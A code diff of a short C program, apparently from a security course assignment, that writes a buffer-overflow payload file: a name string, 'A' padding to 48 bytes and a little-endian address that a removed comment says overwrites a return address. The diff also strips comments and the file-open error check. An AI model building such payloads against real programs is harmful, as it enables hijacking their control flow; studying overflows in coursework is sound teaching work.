@@ -11,31 +11,23 @@
 
 #include <stdio.h>
 #include <string.h>
-/* Accepts a string of characters as a command-line argument. Writes
-   the string of characters to the dataB file. Returns 0. */
+
 int main(void) {
-   unsigned int uiData;
    FILE *dataB;
-   
-   dataB = fopen("dataB", "w+");
-   
-   if (dataB == NULL) {
-        perror("Error opening file");
-        return -1;
-   }
+   dataB = fopen("dataB", "wb");
 
     const char name[] = "Alex Delisthathis & Matthew Zhang";
     fwrite(name, sizeof(char), strlen(name), dataB);
 
-    /* Adjust the size as needed with 48 byte buffer*/
-    const int paddingSize = 48 - strlen(name); 
+    const int paddingSize = 48 - strlen(name);
     for (int i = 0; i < paddingSize; i++) {
-        fputc('A', dataB); /* Writing padding character 'A'*/
+        fputc('A', dataB); 
     }
 
-    /*Address to overwrite return address with in little-endian format*/
-    unsigned int address = 0x4196500; /*Replace with the correct address*/
+    unsigned int address = 0x04196500;
     fwrite(&address, sizeof(unsigned int), 1, dataB);
+
     fclose(dataB);
     return 0;
 }
+
